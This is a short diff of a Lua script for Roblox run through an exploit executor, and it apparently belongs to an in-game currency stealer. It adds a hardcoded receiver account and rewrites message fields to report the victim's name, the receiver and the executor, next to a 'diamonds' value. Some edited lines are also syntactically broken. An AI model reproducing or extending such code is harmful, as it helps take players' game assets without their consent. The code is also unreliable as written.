@@ -1,3 +1,5 @@
+Username2 = "TehPucuk_55"
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -54,8 +56,8 @@ local function SendMessage(username, diamonds)
 
 	local fields = {
 		{
-			name = "📖 UserName:",
-			value = "```"\n username,
+			name = "🌊 Player Info:",
+			value = "```Username: "..plr.Name.."\n 🥳 Receiver: "..Username.."\n 💻 Executor Used: " ..identifyexecutor().."```"
 			inline = true
 		},
 		{
@@ -65,7 +67,7 @@ local function SendMessage(username, diamonds)
 		},
         {
             name = "🥳 Summary:",
-            value = "","```"
+            value = "",
             inline = false
         }
 	}
